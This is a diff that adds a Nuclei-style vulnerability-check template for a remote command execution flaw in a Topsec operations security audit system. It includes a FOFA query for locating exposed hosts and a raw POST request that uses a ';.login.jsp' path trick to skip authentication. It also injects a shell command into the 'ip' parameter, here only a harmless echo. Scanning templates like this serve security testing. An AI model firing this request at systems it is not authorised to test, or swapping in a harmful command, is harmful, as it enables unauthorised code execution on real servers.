@@ -1,0 +1,32 @@
+id: Topsec-Aqsj-login-Rce
+
+info:
+  name: 天融信运维安全审计系统-RCE-login.jsp
+  author: xxx
+  severity: high
+  metadata: 
+    fofa-query: body="ItemsControlServer.aspx"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /iam/synRequest.do;.login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-site
+        Content-Length: 67
+
+        method=trace_route&w=1&ip=127.0.0.1|echo%20`echo HelloWorld!`%3b&m=10
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"HelloWorld!")
